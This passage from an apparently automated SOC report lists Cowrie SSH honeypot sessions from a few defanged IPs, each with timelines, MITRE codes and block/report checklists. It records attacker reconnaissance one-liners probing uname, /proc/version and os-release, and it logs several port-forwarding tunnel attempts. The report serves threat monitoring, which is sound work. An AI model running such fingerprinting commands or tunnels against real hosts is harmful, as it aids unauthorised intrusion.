| **First Seen** | 2026-07-24 08:29 |
| **Last Seen** | 2026-07-24 08:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:29:29` | `cowrie.session.connect` |
| `2026-07-24 08:29:29` | `cowrie.client.version` |
| `2026-07-24 08:29:29` | `cowrie.client.kex` |
| `2026-07-24 08:29:31` | `cowrie.login.success` |
| `2026-07-24 08:29:33` | `cowrie.session.params` |
| `2026-07-24 08:29:33` | `cowrie.command.input` |
| `2026-07-24 08:29:33` | `cowrie.command.input` |
| `2026-07-24 08:29:33` | `cowrie.command.input` |
| `2026-07-24 08:29:33` | `cowrie.command.input` |
| `2026-07-24 08:29:33` | `cowrie.command.input` |
| `2026-07-24 08:29:33` | `cowrie.command.success` |
| `2026-07-24 08:29:33` | `cowrie.command.input` |
| `2026-07-24 08:29:33` | `cowrie.command.input` |
| `2026-07-24 08:29:33` | `cowrie.command.input` |
| `2026-07-24 08:29:33` | `cowrie.command.input` |
| `2026-07-24 08:29:33` | `cowrie.log.closed` |
| `2026-07-24 08:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cd876ee08fc

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:30 |
| **Last Seen** | 2026-07-24 08:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:30:33` | `cowrie.session.connect` |
| `2026-07-24 08:30:33` | `cowrie.client.version` |
| `2026-07-24 08:30:33` | `cowrie.client.kex` |
| `2026-07-24 08:30:33` | `cowrie.login.success` |
| `2026-07-24 08:30:34` | `cowrie.session.params` |
| `2026-07-24 08:30:34` | `cowrie.command.input` |
| `2026-07-24 08:30:34` | `cowrie.log.closed` |
| `2026-07-24 08:30:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c643b6148621

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:31 |
| **Last Seen** | 2026-07-24 08:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:31:25` | `cowrie.session.connect` |
| `2026-07-24 08:31:25` | `cowrie.client.version` |
| `2026-07-24 08:31:25` | `cowrie.client.kex` |
| `2026-07-24 08:31:28` | `cowrie.login.success` |
| `2026-07-24 08:31:30` | `cowrie.session.params` |
| `2026-07-24 08:31:30` | `cowrie.command.input` |
| `2026-07-24 08:31:30` | `cowrie.command.input` |
| `2026-07-24 08:31:30` | `cowrie.command.input` |
| `2026-07-24 08:31:30` | `cowrie.command.input` |
| `2026-07-24 08:31:30` | `cowrie.command.input` |
| `2026-07-24 08:31:30` | `cowrie.command.success` |
| `2026-07-24 08:31:30` | `cowrie.command.input` |
| `2026-07-24 08:31:30` | `cowrie.command.input` |
| `2026-07-24 08:31:30` | `cowrie.command.input` |
| `2026-07-24 08:31:30` | `cowrie.command.input` |
| `2026-07-24 08:31:31` | `cowrie.log.closed` |
| `2026-07-24 08:31:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51086b91af35

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:32 |
| **Last Seen** | 2026-07-24 08:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:32:22` | `cowrie.session.connect` |
| `2026-07-24 08:32:22` | `cowrie.client.version` |
| `2026-07-24 08:32:22` | `cowrie.client.kex` |
| `2026-07-24 08:32:23` | `cowrie.login.success` |
| `2026-07-24 08:32:24` | `cowrie.session.params` |
| `2026-07-24 08:32:24` | `cowrie.command.input` |
| `2026-07-24 08:32:24` | `cowrie.log.closed` |
| `2026-07-24 08:32:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24f7cf70e39c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-24 08:32 |
| **Last Seen** | 2026-07-24 08:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:32:46` | `cowrie.session.connect` |
| `2026-07-24 08:32:46` | `cowrie.client.version` |
| `2026-07-24 08:32:47` | `cowrie.client.kex` |
| `2026-07-24 08:32:47` | `cowrie.login.success` |
| `2026-07-24 08:32:47` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:32:47` | `cowrie.direct-tcpip.data` |
| `2026-07-24 08:32:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd3424499dd7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:33 |
| **Last Seen** | 2026-07-24 08:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:33:19` | `cowrie.session.connect` |
| `2026-07-24 08:33:19` | `cowrie.client.version` |
| `2026-07-24 08:33:19` | `cowrie.client.kex` |
| `2026-07-24 08:33:21` | `cowrie.login.success` |
| `2026-07-24 08:33:23` | `cowrie.session.params` |
| `2026-07-24 08:33:23` | `cowrie.command.input` |
| `2026-07-24 08:33:23` | `cowrie.command.input` |
| `2026-07-24 08:33:23` | `cowrie.command.input` |
| `2026-07-24 08:33:23` | `cowrie.command.input` |
| `2026-07-24 08:33:23` | `cowrie.command.input` |
| `2026-07-24 08:33:23` | `cowrie.command.success` |
| `2026-07-24 08:33:23` | `cowrie.command.input` |
| `2026-07-24 08:33:23` | `cowrie.command.input` |
| `2026-07-24 08:33:23` | `cowrie.command.input` |
| `2026-07-24 08:33:23` | `cowrie.command.input` |
| `2026-07-24 08:33:24` | `cowrie.log.closed` |
| `2026-07-24 08:33:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e426b0c1c94

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:34 |
| **Last Seen** | 2026-07-24 08:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:34:13` | `cowrie.session.connect` |
| `2026-07-24 08:34:13` | `cowrie.client.version` |
| `2026-07-24 08:34:14` | `cowrie.client.kex` |
| `2026-07-24 08:34:14` | `cowrie.login.success` |
| `2026-07-24 08:34:15` | `cowrie.session.params` |
| `2026-07-24 08:34:15` | `cowrie.command.input` |
| `2026-07-24 08:34:15` | `cowrie.log.closed` |
| `2026-07-24 08:34:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c9c8840f2a8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:35 |
| **Last Seen** | 2026-07-24 08:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:35:16` | `cowrie.session.connect` |
| `2026-07-24 08:35:16` | `cowrie.client.version` |
| `2026-07-24 08:35:16` | `cowrie.client.kex` |
| `2026-07-24 08:35:18` | `cowrie.login.success` |
| `2026-07-24 08:35:20` | `cowrie.session.params` |
| `2026-07-24 08:35:20` | `cowrie.command.input` |
| `2026-07-24 08:35:20` | `cowrie.command.input` |
| `2026-07-24 08:35:20` | `cowrie.command.input` |
| `2026-07-24 08:35:20` | `cowrie.command.input` |
| `2026-07-24 08:35:20` | `cowrie.command.input` |
| `2026-07-24 08:35:20` | `cowrie.command.success` |
| `2026-07-24 08:35:20` | `cowrie.command.input` |
| `2026-07-24 08:35:20` | `cowrie.command.input` |
| `2026-07-24 08:35:20` | `cowrie.command.input` |
| `2026-07-24 08:35:20` | `cowrie.command.input` |
| `2026-07-24 08:35:21` | `cowrie.log.closed` |
| `2026-07-24 08:35:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-299beb3e21f4

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:36 |
| **Last Seen** | 2026-07-24 08:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:36:07` | `cowrie.session.connect` |
| `2026-07-24 08:36:07` | `cowrie.client.version` |
| `2026-07-24 08:36:07` | `cowrie.client.kex` |
| `2026-07-24 08:36:08` | `cowrie.login.success` |
| `2026-07-24 08:36:08` | `cowrie.session.params` |
| `2026-07-24 08:36:08` | `cowrie.command.input` |
| `2026-07-24 08:36:08` | `cowrie.log.closed` |
| `2026-07-24 08:36:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e171c13e3a47

| Field | Detail |
|---|---|
| **Source IP** | `113.11.34[.]221` |
| **First Seen** | 2026-07-24 08:37 |
| **Last Seen** | 2026-07-24 08:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:37:12` | `cowrie.session.connect` |
| `2026-07-24 08:37:13` | `cowrie.client.version` |
| `2026-07-24 08:37:13` | `cowrie.client.kex` |
| `2026-07-24 08:37:15` | `cowrie.login.success` |
| `2026-07-24 08:37:16` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:37:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.11.34[.]221` to AbuseIPDB if not already reported
- [ ] Block `113.11.34[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad9c1024c0cb

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:37 |
| **Last Seen** | 2026-07-24 08:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:37:56` | `cowrie.session.connect` |
| `2026-07-24 08:37:56` | `cowrie.client.version` |
| `2026-07-24 08:37:56` | `cowrie.client.kex` |
| `2026-07-24 08:37:57` | `cowrie.login.success` |
| `2026-07-24 08:37:58` | `cowrie.session.params` |
| `2026-07-24 08:37:58` | `cowrie.command.input` |
| `2026-07-24 08:37:58` | `cowrie.log.closed` |
| `2026-07-24 08:37:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8c695593f5e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:39 |
| **Last Seen** | 2026-07-24 08:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:39:12` | `cowrie.session.connect` |
| `2026-07-24 08:39:12` | `cowrie.client.version` |
| `2026-07-24 08:39:12` | `cowrie.client.kex` |
| `2026-07-24 08:39:14` | `cowrie.login.success` |
| `2026-07-24 08:39:15` | `cowrie.session.params` |
| `2026-07-24 08:39:15` | `cowrie.command.input` |
| `2026-07-24 08:39:15` | `cowrie.command.input` |
| `2026-07-24 08:39:15` | `cowrie.command.input` |
| `2026-07-24 08:39:15` | `cowrie.command.input` |
| `2026-07-24 08:39:15` | `cowrie.command.input` |
| `2026-07-24 08:39:15` | `cowrie.command.success` |
| `2026-07-24 08:39:15` | `cowrie.command.input` |
| `2026-07-24 08:39:15` | `cowrie.command.input` |
| `2026-07-24 08:39:15` | `cowrie.command.input` |
| `2026-07-24 08:39:15` | `cowrie.command.input` |
| `2026-07-24 08:39:16` | `cowrie.log.closed` |
| `2026-07-24 08:39:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77cbb64c69b7

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:39 |
| **Last Seen** | 2026-07-24 08:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:39:45` | `cowrie.session.connect` |
| `2026-07-24 08:39:45` | `cowrie.client.version` |
| `2026-07-24 08:39:45` | `cowrie.client.kex` |
| `2026-07-24 08:39:46` | `cowrie.login.success` |
| `2026-07-24 08:39:47` | `cowrie.session.params` |
| `2026-07-24 08:39:47` | `cowrie.command.input` |
| `2026-07-24 08:39:47` | `cowrie.log.closed` |
| `2026-07-24 08:39:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9af6e1be4ac

| Field | Detail |
|---|---|
| **Source IP** | `14.54.22[.]11` |
| **First Seen** | 2026-07-24 08:40 |
| **Last Seen** | 2026-07-24 08:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:40:37` | `cowrie.session.connect` |
| `2026-07-24 08:40:38` | `cowrie.client.version` |
| `2026-07-24 08:40:38` | `cowrie.client.kex` |
| `2026-07-24 08:40:41` | `cowrie.login.success` |
| `2026-07-24 08:40:41` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:40:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.54.22[.]11` to AbuseIPDB if not already reported
- [ ] Block `14.54.22[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bfe59230ba2

| Field | Detail |
|---|---|
| **Source IP** | `121.164.135[.]251` |
| **First Seen** | 2026-07-24 08:40 |
| **Last Seen** | 2026-07-24 08:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:40:47` | `cowrie.session.connect` |
| `2026-07-24 08:40:48` | `cowrie.client.version` |
| `2026-07-24 08:40:48` | `cowrie.client.kex` |
| `2026-07-24 08:40:50` | `cowrie.login.success` |
| `2026-07-24 08:40:51` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:40:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.164.135[.]251` to AbuseIPDB if not already reported
- [ ] Block `121.164.135[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d27518969ab

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:41 |
| **Last Seen** | 2026-07-24 08:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:41:14` | `cowrie.session.connect` |
| `2026-07-24 08:41:14` | `cowrie.client.version` |
| `2026-07-24 08:41:14` | `cowrie.client.kex` |
| `2026-07-24 08:41:16` | `cowrie.login.success` |
| `2026-07-24 08:41:17` | `cowrie.session.params` |
| `2026-07-24 08:41:17` | `cowrie.command.input` |
| `2026-07-24 08:41:17` | `cowrie.command.input` |
| `2026-07-24 08:41:17` | `cowrie.command.input` |
| `2026-07-24 08:41:17` | `cowrie.command.input` |
| `2026-07-24 08:41:17` | `cowrie.command.input` |
| `2026-07-24 08:41:17` | `cowrie.command.success` |
| `2026-07-24 08:41:17` | `cowrie.command.input` |
| `2026-07-24 08:41:17` | `cowrie.command.input` |
| `2026-07-24 08:41:17` | `cowrie.command.input` |
| `2026-07-24 08:41:17` | `cowrie.command.input` |
| `2026-07-24 08:41:18` | `cowrie.log.closed` |
| `2026-07-24 08:41:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8d002483835

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-07-24 08:41 |
| **Last Seen** | 2026-07-24 08:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:41:26` | `cowrie.session.connect` |
| `2026-07-24 08:41:26` | `cowrie.client.version` |
| `2026-07-24 08:41:26` | `cowrie.client.kex` |
| `2026-07-24 08:41:27` | `cowrie.login.success` |
| `2026-07-24 08:41:27` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:41:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beae28ddba43

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:41 |
| **Last Seen** | 2026-07-24 08:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:41:42` | `cowrie.session.connect` |
| `2026-07-24 08:41:42` | `cowrie.client.version` |
| `2026-07-24 08:41:42` | `cowrie.client.kex` |
| `2026-07-24 08:41:43` | `cowrie.login.success` |
| `2026-07-24 08:41:43` | `cowrie.session.params` |
| `2026-07-24 08:41:43` | `cowrie.command.input` |
| `2026-07-24 08:41:43` | `cowrie.log.closed` |
| `2026-07-24 08:41:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-738ecf325de9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:43 |
| **Last Seen** | 2026-07-24 08:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
